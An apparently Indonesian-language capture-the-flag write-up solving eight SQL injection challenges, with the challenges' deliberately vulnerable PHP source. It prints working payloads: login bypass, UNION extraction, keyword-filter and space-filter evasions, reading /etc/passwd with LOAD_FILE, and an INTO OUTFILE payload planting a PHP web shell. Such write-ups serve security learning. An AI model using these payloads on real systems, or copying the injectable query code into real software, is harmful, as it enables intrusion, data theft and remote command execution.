<!DOCTYPE html>
<html>
<!--
====================================================
       _         _ _ _       _            ___ 
      | |       | (_) |     | |          / __)
  ____| | _   _ | |_| | ____| | _   ____| |__ 
 / _  | || \ / || | | |/ _  | || \ / ___)  __)
( ( | | |_) | (_| | | ( ( | | | | | |   | |   
 \_||_|____/ \____|_|_|\_||_|_| |_|_|   |_|  
 
====================================================
@ABDILAHRF
====================================================
-->
<head>
<meta charset="utf-8">
<title>WRITEUP SQLINJECTION CHALLENGES &vert; @ABDILAHRF</title>
<meta name="description" content="Writeup SQLInjection Challenges">
<meta name="keywords" content="sqlinjection">

<!-- Twitter Cards -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="/images/sqlinjection.jpg">

<meta name="twitter:title" content="Writeup SQLInjection Challenges">
<meta name="twitter:description" content="Writeup SQLInjection Challenges">
<meta name="twitter:creator" content="@abdilahrf">

<!-- Open Graph -->
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="Writeup SQLInjection Challenges">
<meta property="og:description" content="Writeup SQLInjection Challenges">
<meta property="og:url" content="http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall">
<meta property="og:site_name" content="@abdilahrf">
<meta property="og:image" content="http://localhost:4000/images//images/sqlinjection.jpg">





<link rel="canonical" href="http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall">
<link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="@abdilahrf Feed">
<link rel="author" href="https://plus.google.com/?rel=author">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />


    <link href='http://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,600,300,800,700' rel='stylesheet' type='text/css'>
	<link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/font-awesome.min.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/normalize.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/nprogress.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/foundation.min.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/style.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/post.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/code/monokai.css">





<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
<!-- 32x32 -->
<link rel="shortcut icon" href="http://localhost:4000/favicon.png">
<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
<link rel="apple-touch-icon-precomposed" href="http://localhost:4000/images/apple-touch-icon-precomposed.png">
<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://localhost:4000/images/apple-touch-icon-72x72-precomposed.png">
<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://localhost:4000/images/apple-touch-icon-114x114-precomposed.png">
<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/images/apple-touch-icon-144x144-precomposed.png">

<style type="text/css">@media only screen and (min-width:43.75em){.notepad-post-content div>p:first-child:first-letter{float:left;font-size:4.688rem;line-height:4.375rem;padding-top:.25rem;padding-right:.5rem;padding-left:.188rem;font-family:serif}}</style>
</head>
<body class="post-template" itemscope itemtype="http://schema.org/WebPage">  

        <main id="notepad-post-container" class="notepad-post-container intro-effect-sliced" role="main">
            <header class="notepad-post-header">
                <div class="bg-img"></div>
                
                <div class="notepad-post-menu-header">

                    <a class="notepad-blog-logo" href="http://localhost:4000">
                        <img src="http://localhost:4000/images/logo.png" alt="Blog Logo" />
                    </a>

                <div class="notepad-blog-menu">      
    <div class="notepad-mobile-menu show-for-small">
        <a href="#"><i class="fa fa-bars"></i></a>
    </div>
    <ul class="notepad-menu">
        <li class="notepad-mobile-close-btn show-for-small text-right">
            <a href="#"><i class="fa fa-times"></i></a>
        </li>

            <li>
                    <a href="http://localhost:4000/">Home</a>
                 </li>

            <li>
                    <a href="http://localhost:4000/featured">Featured Posts</a>
                 </li>

            <li>
                    <a href="http://localhost:4000/categories">Categories</a>
                 </li>

            <li>
                    <a href="http://localhost:4000/about">About</a>
                 </li>
            
           <li><a href="http://localhost:4000/feed.xml" title="Atom/RSS feed"><i class="icon-rss"></i> Feed</a></li>
    </ul>

</div>
            </div>

            <div class="notepad-post-title bg-check">
                <h1>Writeup SQLInjection Challenges</h1>
                <p>by <strong>Abdillah Muhamad</strong> &#8212; on <a href="http://localhost:4000/tags/index.html#sqlinjection" data-toggle="tooltip" title="Posts tagged with sqlinjection" rel="tag">sqlinjection</a> <strong><!-- <time datetime="2017-03-20 00:00:00 +0700">2017-03-20 00:00:00 +0700</time> --></strong></p>
            </div>
            <div class="bg-img"></div>
        </header>
        <button class="trigger bg-check" data-info="Read more"><span>Trigger</span></button>
        <img src="/images/sqlinjection.jpg" alt="cover-image" />

        <article class="notepad-post-content post">
            <div><h3 id="sql-injection-challenges-writeup">SQL Injection Challenges Writeup</h3>

<p>Kita dapet soal ada 8 soal SQL injection yang cara untuk solvenya beragam, beberapa dari soal ngak bisa di selesain menggunakan automated tools seperti “SQLmap”,”Havij” atau kawan-kawannya di sini juga ada beberapa logic bypass yang perlu kita cari sendiri.</p>

<h3 id="level-1">Level 1</h3>

<blockquote>
  <p>My friend created a website where we can store secrets… Unfortunately, we can only see our own. Help me find all of my friend’s secrets.</p>
</blockquote>

<p>Diberikan soal dan disertakan source code nya berikut :</p>

<pre><code class="language-php">&lt;?php 

if (isset($_GET['source'])) {
    die(highlight_file(__FILE__));
}

require("conf/level1.conf.php"); 
error_reporting(0);

session_start();
if (isset($_POST['secret'])) { 
    $query = $conn-&gt;prepare("INSERT INTO secrets(session_id, secret) VALUES (?, ?)");
    session_regenerate_id();
    $current_session_id = session_id();
    //die($current_session_id);
    $query-&gt;bind_param('ss', $current_session_id, $_POST['secret']);
    $query-&gt;execute() or die($conn-&gt;error);
}

if (isset($_POST['session_id'])) { 
    $query = "SELECT * FROM secrets WHERE session_id = '" . $_POST['session_id'] . "'";
    $result = $conn-&gt;query($query);
} else {
    $query = "SELECT * FROM secrets WHERE session_id = '" . session_id() . "'";
    $result = $conn-&gt;query($query);
} 

?&gt;

&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
&lt;head&gt;
        &lt;link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;div id="custom-bootstrap-menu" class="navbar navbar-default " role="navigation"&gt;
            &lt;div class="container-fluid"&gt;
            &lt;div class="navbar-header"&gt;&lt;a class="navbar-brand" href="#"&gt;Secret Diary&lt;/a&gt;
                &lt;button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-menubuilder"&gt;&lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt;&lt;span class="icon-bar"&gt;&lt;/span&gt;&lt;span class="icon-bar"&gt;&lt;/span&gt;&lt;span class="icon-bar"&gt;&lt;/span&gt;
                &lt;/button&gt;
            &lt;/div&gt;
            &lt;div class="collapse navbar-collapse navbar-menubuilder"&gt;
                &lt;ul class="nav navbar-nav navbar-left"&gt;
                &lt;li&gt;&lt;a href="#"&gt;Home&lt;/a&gt;
                &lt;/li&gt;
                &lt;/ul&gt;
            &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
        &lt;div class="container-fluid"&gt;
        &lt;?php
        if (isset($_POST['secret'])) {
            echo '&lt;div class="alert alert-success" role="alert"&gt;Secret added successfully. You can view your secrets with the following session ID : '. session_id() .'&lt;/div&gt;';
        }
        ?&gt;
        &lt;div class="row"&gt;
            &lt;div class="col-md-2"&gt;&lt;/div&gt;
            &lt;div class="col-md-4"&gt;
                &lt;form method="POST" action="level1.php"&gt;
                    &lt;div class="input-group"&gt;
                      &lt;input type="text" name="session_id" class="form-control" placeholder="Your session ID" aria-describedby="basic-addon2"&gt;
                      &lt;span class="input-group-btn"&gt;
                        &lt;button class="btn btn-default" type="submit"&gt;Get your secrets!&lt;/button&gt;
                     &lt;/span&gt;
                    &lt;/div&gt;
                &lt;/form&gt;
            &lt;/div&gt;
            &lt;div class="col-md-4"&gt;
                &lt;form method="POST" action="level1.php"&gt;

                    &lt;div class="input-group"&gt;
                      &lt;input type="text" name="secret" class="form-control" placeholder="Your secret" aria-describedby="basic-addon2"&gt;
                      &lt;span class="input-group-btn"&gt;
                        &lt;button class="btn btn-default" type="submit"&gt;Add a new secret!&lt;/button&gt;
                     &lt;/span&gt;
                    &lt;/div&gt;
                &lt;/form&gt;
            &lt;/div&gt;
            &lt;div class="col-md-2"&gt;&lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;

    &lt;br/&gt;
    &lt;br/&gt;
    &lt;br/&gt;

        &lt;div class="container-fluid"&gt;
        &lt;div class="row"&gt;
            &lt;div class="col-md-4"&gt;&lt;/div&gt;
            &lt;div class="col-md-4"&gt;
                &lt;div class="panel panel-default"&gt;
                  &lt;div class="panel-heading"&gt;Your secrets&lt;/div&gt;

                  &lt;!-- Table --&gt;
                  &lt;table class="table"&gt;
                    &lt;?php
                    if (isset($result) &amp;&amp; $result-&gt;num_rows &gt; 0) {
                        // output data of each row
                        while($row = $result-&gt;fetch_assoc()) {
                        echo "&lt;tr&gt;&lt;td&gt;" . htmlspecialchars($row['secret']) . "&lt;/td&gt;&lt;/tr&gt;";    
                        }
                    } else {
                        echo "&lt;tr&gt;&lt;td&gt;You don't have any secrets yet.&lt;/td&gt;&lt;/tr&gt;";
                    }
                    ?&gt;
                  &lt;/table&gt;
                &lt;/div&gt;
            &lt;/div&gt;
            &lt;div class="col-md-4"&gt;&lt;/div&gt;
        &lt;/div&gt;

        &lt;/div&gt;

    &lt;script
              src="https://code.jquery.com/jquery-3.1.1.min.js"
              integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
              crossorigin="anonymous"&gt;&lt;/script&gt;

        &lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt;


&lt;/body&gt;
&lt;/html&gt;
1
</code></pre>

<p>cara untuk menjalankan query yang benar adalah menggunakan prepared statement seperti yang di gunakana pada<code>$query = $conn-&gt;prepare("INSERT INTO secrets(session_id, secret) VALUES (?, ?)");</code>namun masih ada kesalahan pada bagian <code>$query = "SELECT * FROM secrets WHERE session_id = '" . $_POST['session_id'] . "'";</code> di sini kesalahannya dia langsung memasukan input user ke dalam query tanpa menggunakan prepared statement jadi kita bisa injeksi sql di situ</p>

<p>dengan simple <code>a' OR 1=1#</code> kita bisa mendapatkan flagnya</p>

<p><img src="/images/flag-sqli-lv1.png" alt="" /></p>

<h3 id="level-2">Level 2</h3>

<blockquote>
  <p>I think an administrator blocked my account. Can you help me steal someone else’s account?</p>

  <p><strong>Note</strong>: There are two flags in this challenge.</p>
</blockquote>

<p>Diberikan soal yang meminta kita untuk melakukan login dan kita juga diberikan akses ke source code nya</p>

<p><img src="/images/sqli-lv2.png" alt="" /></p>

<pre><code class="language-php">&lt;?php 
if (isset($_GET['source'])) {
    die(highlight_file(__FILE__));
}
require("conf/level2.conf.php"); 
error_reporting(0);

if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {

    // $query = "SELECT flag FROM my_secret_table"; We leave commented code in production because we're cool.

    $query = "SELECT username FROM users where username = '" . $_POST['username'] . "' and password = ?";

    // We use prepared statements, it must be secure.
    $query = $conn-&gt;prepare($query); 

    // If query is invalid
    if ($query === false) {
        $error = true;
        $error_msg = "&lt;strong&gt;Error!&lt;/strong&gt; Invalid SQL query";    
    } else {

    // Bind password param
    $query-&gt;bind_param("s", $_POST['password']);
    $query-&gt;execute();
    $query-&gt;bind_result($user);
    $query-&gt;fetch();

        // Check if a valid user has been found
        if ($user != NULL) {
            session_start();
            $_SESSION['is_logged_in'] = true;
            $_SESSION['username'] = $user;
        } else {
            $error = true;
            $error_msg = "&lt;strong&gt;Wrong!&lt;/strong&gt; Username/Password is invalid.";
        }
    }

}
?&gt;
&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"&gt;
    &lt;style&gt;
        .corb-body { background-color: #333;}

        .centered {
          position: fixed;
          top: 50%;
          left: 50%;
          /* bring your own prefixes */
          transform: translate(-50%, -50%);
        }

        .corb-login-length { width: 500px;}
        .corb-submit { position: relative; left: auto; right: -420px;}
        .corb-flag { color: #0F0; }
        .corb-alert { margin-top: 20px; }
    &lt;/style&gt;
    &lt;/head&gt;
    &lt;body class="corb-body container-fluid"&gt;
        &lt;?php if ($_SESSION['is_logged_in'] !== true) { ?&gt;
            &lt;?php if (isset($error) &amp;&amp; $error === true) { ?&gt;
            &lt;div class="container-fluid corb-alert"&gt;
                &lt;div class="alert alert-danger"&gt;
                    &lt;?php echo $error_msg; ?&gt;
                &lt;/div&gt;
            &lt;/div&gt;
            &lt;?php } ?&gt;

        &lt;div class="row"&gt;
            &lt;div class="centered"&gt;
                &lt;div class="well"&gt;
                    &lt;h3 class="corb-login-length"&gt;Login If You Can&lt;/h3&gt;
                    &lt;br/&gt;
                    &lt;form method="POST"&gt;
                    &lt;input name="username" class="form-control" type="text" placeholder="username"&gt;
                    &lt;br/&gt;
                    &lt;input name="password" class="form-control" type="text" placeholder="password"&gt;
                    &lt;br/&gt;
                    &lt;input name="submit" class="corb-submit btn btn-primary btn-lg" type="submit" value="Login"&gt;
                    &lt;/form&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
        &lt;?php }else { ?&gt;
            &lt;div class="centered"&gt;
                &lt;h1 class="corb-flag"&gt;Welcome &lt;?php echo $_SESSION['username']; ?&gt;! Here's some green text for you.&lt;/h1&gt;        
                &lt;h1 class="corb-flag"&gt;&lt;?php echo $flag; ?&gt;&lt;/h1&gt;        
            &lt;/div&gt;
        &lt;?php } ?&gt;

        &lt;script
              src="https://code.jquery.com/jquery-3.1.1.min.js"
              integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
              crossorigin="anonymous"&gt;&lt;/script&gt;

        &lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt;


    &lt;/body&gt;
&lt;/html&gt;

&lt;?php
session_destroy();
?&gt;
1
</code></pre>

<p>Lagi-lagi di level2 ini mereka juga menggunakan prepared statement nya tidak secara keseluruhan, untuk kolom username dia langsung ambil dari user input dengan <code>$_POST</code> tapi pada kolom password dia mengunakan prepared statement. kita bisa membuat query tersebut selalu mengembalikan true dengan <code>' OR 1=1#</code></p>

<p><img src="/images/flag-sqli-lv2-1.png" alt="" /></p>

<p>pada soal ini diberitahu bahwa ada 2 flag, berarti kita harus coba dig more ke source code yang diberikan dan ada clue di komentar <code>// $query = "SELECT flag FROM my_secret_table"; We leave commented code in production because we're cool.</code></p>

<p>dan karena username yang di select dari database di simpan kedalam session dan ditampilkan saat login maka kita bisa menggunakan union untuk mereplace username yang sebenarnya dengan hasil dari query yang kita mau dengan menggunakan union <code>' union select flag from my_secret_table #</code> sebagai username dan di dapatkan flagnya</p>

<p><img src="/images/flag-sqli-lv2-2.png" alt="" /></p>

<h3 id="level-3">Level 3</h3>

<blockquote>
  <p>Time for bug bounties! This multinational technology company has been hacked so many times, we might be able find a new bug and make some money out of it…</p>
</blockquote>

<p>Diberikan soal seperti search engine <code>Google</code> tapi ini namanya <code>Gogol</code></p>

<p><img src="/images/soal-sqli-lv3.png" alt="" /></p>

<pre><code class="language-php">&lt;?php 
if (isset($_GET['source'])) {
    die(highlight_file(__FILE__));
}

require("conf/level3.conf.php"); 
error_reporting(0);


if (isset($_GET['q'])) {

    $filter = array('union', 'select');

    // Remove all banned characters
    foreach ($filter as $banned) {
        $_GET['q'] = preg_replace('/' . $banned . '/i', '', $_GET['q']);
    } 
}


?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Gogol Search&lt;/title&gt;
 &lt;link rel="stylesheet" href="http://www.goglogo.com/include/goglogo.css" type="text/css" /&gt;
  &lt;/head&gt;

 &lt;body style="margin:0;padding:0;"&gt;
 &lt;div id="overlay_bg" style="display:none; background-color:#000000; position:fixed; z-index:1001"&gt;&lt;/div&gt;
    &lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
    &lt;div class="content-area"&gt;
        &lt;div class="logo"&gt;
    &lt;img src="http://funnylogo.info/logo/Google/White/Gogol.aspx"&gt;
        &lt;/div&gt;
        &lt;div class="searchBox"&gt;
            &lt;table cellspacing="0" cellpadding="0" border="0"&gt;
            &lt;tr&gt;
                &lt;td&gt;
                    &lt;form name="frm" id="frm" method="GET"&gt;
                    &lt;input type="text" name="q" size="40" value=""/&gt;
                    &lt;input type="submit"/&gt;
                    &lt;br /&gt;&lt;br /&gt;
                    &lt;/form&gt;
                &lt;/td&gt;
            &lt;/tr&gt;
            &lt;/table&gt;
            &lt;br/&gt;
        &lt;/div&gt;

    &lt;?php
    if (isset($_GET['q'])) {

        $query = "SELECT * FROM search_engine WHERE title LIKE '%" . $_GET['q'].  "%' OR description LIKE '%" . $_GET['q'] .  "%' OR link LIKE '%" . $_GET['q'] . "%';";
        $result = $conn-&gt;query($query);

        echo  "&lt;h2&gt;Number of results for '". htmlspecialchars($_GET['q']) . "' : " . $result-&gt;num_rows . "&lt;/h2&gt;";
    ?&gt;
    &lt;?php
        if (isset($result) &amp;&amp; $result-&gt;num_rows &gt; 0) {
            echo "&lt;hr/&gt;";
            echo "&lt;br/&gt;";

            // output data of each row
            while($row = $result-&gt;fetch_assoc()) {
                echo "&lt;div&gt;";
                echo "&lt;a href='" . $row['link'] . "'&gt;&lt;h2&gt;" . htmlspecialchars($row['title']) . "&lt;/h2&gt;&lt;/a&gt;";
                echo "&lt;h3&gt;" . htmlspecialchars($row['link']) . "&lt;/h3&gt;";
                echo "&lt;p&gt;" . htmlspecialchars($row['description']) . "&lt;/p&gt;";
            }
        }
    ?&gt;

    &lt;/div&gt;
&lt;/div&gt;
 &lt;/body&gt;
&lt;/html&gt;
&lt;?php } ?&gt;
1
</code></pre>

<p>Oke, kita coba analisa source code yang di dapatkan, disini input kita di treatment secara berbeda dengan level sebelumnya kali ini menggunakan parameter <code>$_GET</code> kita bisa menggunakan <code>union</code> lagi untuk me-replace hasil dari query dengan hasil query yang kita inginkan tapi permasalahannya union dan select ada di blacklist.</p>

<pre><code class="language-php">$filter = array('union', 'select');

// Remove all banned characters
foreach ($filter as $banned) {
$_GET['q'] = preg_replace('/' . $banned . '/i', '', $_GET['q']);
}
</code></pre>

<p>semua yang match dengan union atau select akan di replace menjadi empty string “” ini sebenernya bad practice karena kita bisa melakukan bypass dengan cara <code>uniunionon</code> maka union yang di tengah akan di hapus menjadi empty string sehingga terbentuklah union yang tadinya di blacklist, kita sudah berhasil melakukan bypass terhadap filter yang ada.</p>

<p>maka kita bisa menggunakan <code>' uniunionon selselectect concat(table_name),1,1 from information_schema.tables#</code> untuk mendapatkan semua table yang ada dan kita menemukan table <code>secret</code></p>

<p><img src="/images/list-table-sqli-lv3.png" alt="" /></p>

<p>kemudian <code>' uniunionon selselectect concat(column_name),1,1 from information_schema.columns where table_name='secret'#</code> untuk mendapatkan kolom dari table secret</p>

<p><img src="/images/column-sqli-lv3.png" alt="" />ketika kita udah tau nama kolom nya dan tabelnya tinggal dimunculin aja tuh flag gan pake ini <code>' uniunionon selselectect flag,1,1 from secret#</code></p>

<p><img src="/images/flag-sqli-lv3.png" alt="" /></p>

<h3 id="level-4">Level 4</h3>

<blockquote>
  <p>Seems like our previous bug has been patched now… Let’s double check that they did their job properly.</p>
</blockquote>

<p>Soal yang di berikan sama seperti soal di lvl 3 tapi sekarang blacklist nya diperbaharui</p>

<pre><code class="language-php">if (isset($_GET['q'])) {

    $filter = array('UNION', 'SELECT');

    // Remove all banned characters
    foreach ($filter as $banned) {
        if (strpos($_GET['q'], $banned) !== false) die("Hacker detected"); 
        if (strpos($_GET['q'], strtolower($banned)) !== false) die("Hacker detected"); 
    } 
}
</code></pre>

<p>Singkat cerita jadi itu yang di blacklist adalah “UNION,union,SELECT,SELECT” sehingga kita bisa menggunakan “UNiON,SElECT” dengan cara yang sama dengan level3 kita bisa mendapatkan flagnya</p>

<p><code>3' UNiON SElECT concat(username,password),1,1 from users#</code></p>

<p><img src="/images/lvl4-sqli-flag.png" alt="" /></p>

<h3 id="level-5">Level 5</h3>

<blockquote>
  <p>These developers are sloppy… They claim that their website is secure now (for the second time), I hope they are right this time…</p>
</blockquote>

<p>Di level5 kali ini di filter kita tidak boleh menggunakan space.</p>

<pre><code class="language-php">if (isset($_GET['q'])) {
    // Ban space character
    if (strpos($_GET['q'], " ") !== false) die("Hacker detected"); 
}
</code></pre>

<p>ada beberapa trik yang bisa di gunakan untuk menggantikan space di SQL contohya <code>/**/</code> kita mengunakan komentar untuk mengantikan spasi. dengan menggunakan cara yang sama dengan level sebelumnya kita bisa mendapatkan flagnya</p>

<p><code>'/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secret#</code></p>

<p><img src="/images/sqli-lv5-flag.png" alt="" /></p>

<h3 id="level-6">Level 6</h3>

<blockquote>
  <p>I’m starting to believe that these developers are complete idiots. They just claimed that blacklisting single-quotes and double-quotes solve every SQL injection issue.</p>

  <p>Let’s prove them wrong.</p>
</blockquote>

<p>Kita diberikan soal yang sama lagi dengan level sebelumnya tapi kali ini single quote dan double quote di blacklist jadi kita harus melakukan SQLinjection tanpa single quote dan double quote.</p>

<pre><code class="language-php">if (isset($_GET['q'])) {
    // Ban space character
    if (strpos($_GET['q'], "'") !== false) die("Hacker detected"); 
    if (strpos($_GET['q'], '"') !== false) die("Hacker detected"); 
}
</code></pre>

<h3 id="level-7">Level 7</h3>

<blockquote>
  <p>My teacher has this weird website. I doubt there’s any useful information in the database. Maybe we can leak the /etc/passwd file instead?</p>
</blockquote>

<p>Setelah di enumurasi ternyata beberapa keyword di blacklist, seperti : **Union,Select,Load_File,From. **Dan Spasi juga di blacklist ternyata ketika di coba kita bisa melakukan bypass pada keyword yang di filter dengan cara yang di level sebelumnya yaitu ketika match dengan suatu keyword dia akan mereplace dengan empty string maka kita bisa mengunakan payload <code>' UNIunionON SELselectECT concat(table_name) frfromom information_schema.tables#</code> namun masih error ternyata karena kita masih mengunakan spasi modifikasi payload tanpa menggunakan spasi <code>level7.php?id=6565656/**/UNIunionON/**/SELselectECT/**/LOAD_load_fileFILE(%27/etc/passwd%27)#</code></p>

<p><img src="/images/lvl8-sqli.png" alt="" /></p>

<h3 id="level-8">Level 8</h3>

<blockquote>
  <p>I have no idea how I landed here, but this website is making me doubt everything I know.</p>

  <p>Is global warming real???</p>

  <p>Can Trump control the weather???</p>

  <p>Is the Earth flat???</p>

  <p>There’s only one way to find out : let’s pop a shell.</p>
</blockquote>

<p><code>4444+union+select+null,"&lt;?php%20system($_GET[\"cmd\"]);?&gt;"%20INTO%20OUTFILE%20"/var/www/html/uploads/lala.php"#</code></p>

<p>disini kita bisa menggunakan into outfile untuk menulis file backdoor ke folder uploads</p>

<p><img src="/images/rce-sqli-lv8.png" alt="" />Dan kita menemukan secret folder <strong>secret_level8_folder_you_wont_be_able_to_guess_without_actually_getting_a_shell</strong></p>

<p><img src="/images/secret-folder-sqli-lv8.png" alt="" />kemudian kita mendapatkan flagnya</p>

<p><img src="/images/flag-sqli-lv8.png" alt="" /></p>

</div>
        </article>
        <div class="cf"></div>
        <div class="row text-center">
            <section class="notepad-post-share">
                <a class="twitter-icon" href="https://twitter.com/intent/tweet?text=&quot;Writeup SQLInjection Challenges&quot;%20http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall%20via%20&#64;abdilahrf"
                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
                    <i class="fa fa-twitter"></i>
                </a>
                <a class="facebook-icon" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall"
                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
                    <i class="fa fa-facebook"></i>
                </a>
                <a class="google-icon" href="https://plus.google.com/share?url=http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall"
                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title="Share on Google+">
                    <i class="fa fa-google-plus"></i>
                </a>
            </section>
        </div>
        <div class="cf"></div>
        
            <div class="notepad-author-info">
                <div class="row">
                    <section class="notepad-post-author small-12 columns">
                        
                            <img src="https://avatars2.githubusercontent.com/u/6015012?v=3&s=460" class="notepad-post-author-avatar" alt="Abdillah Muhamad's photo">
                        
                        
                            <span class="author-label">Author</span>
                            <h1>Abdillah Muhamad</h1>
                        
                        
                            <p><a href="mailto:hasny1337@gmail.com" class="author-website">hasny1337@gmail.com</a></p>
                        
                        
                            <p>Coffe make you like a hero</p>
                        
                    </section>
                </div>
            </div>
 
        
        <div class="cf"></div>
        
        <section class="notepad-disqus row">
    <div class="small-12 columns">
        <h1 class="notepad-comments-header">Comments</h1>
        <div id="disqus_thread"></div>
        <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'abdilahrf'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </div>
</section>

        <div class="cf"></div>

    <footer class="notepad-site-footer">
    <div class="copyright">
         <section>All content copyright <a href="http://localhost:4000/about">Abdillah Muhamad</a> &copy; 2017 &bull; All rights reserved.</section>
         <section>Proudly published with <a class="icon-ghost" href="https://jekyllrb.com/">Jekyll</a></section>
    </div>
    <div class="social-icons">
        
        
        <a href="http://twitter.com/abdilahrf">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-twitter fa-stack-1x"></i>
            </span>
        </a>
        
        
        <a href="https://plus.google.com/">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-google-plus fa-stack-1x"></i>
            </span>
        </a>
        
        
        
        <a href="http://github.com/abdilahrf">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-github fa-stack-1x"></i>
            </span>
        </a>
        
        
        <a href="http://facebook.com/abdilah.jk">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-facebook fa-stack-1x"></i>
            </span>
        </a>
        
    </div>
    
    <div class="cf"></div>
</footer> 
</main>    
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="http://localhost:4000/assets/js/vendor/jquery-1.11.1.min.js"><\/script>')</script>
    <script src="http://localhost:4000/assets/js/vendor/modernizr.js"></script>
    <script src="http://localhost:4000/assets/js/foundation.min.js"></script>
    <script src="http://localhost:4000/assets/js/vendor/background-check.js"></script>
    <script src="http://localhost:4000/assets/js/vendor/post-header-animations.js"></script>
    <script src="http://localhost:4000/assets/js/notepad.js"></script>
    <script src="http://localhost:4000/assets/js/scripts.min.js"></script>
    <script src="http://localhost:4000/assets/js/vendor/nprogress.js"></script>

    <script>
      $(document).foundation();
    </script>
    <script type='text/javascript'>console.log("@abdilahrf");</script>
    <script type='text/javascript'>console.log("https://abdilahrf.me");</script>


<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-96190645-1', 'auto');
  ga('require', 'displayfeatures');
  ga('send', 'pageview');

</script>

<script>NProgress.start();var interval=setInterval(function(){NProgress.inc()},1000);jQuery(window).load(function(){clearInterval(interval);NProgress.done()});jQuery(window).unload(function(){NProgress.start()});</script>
 
</body>
</html>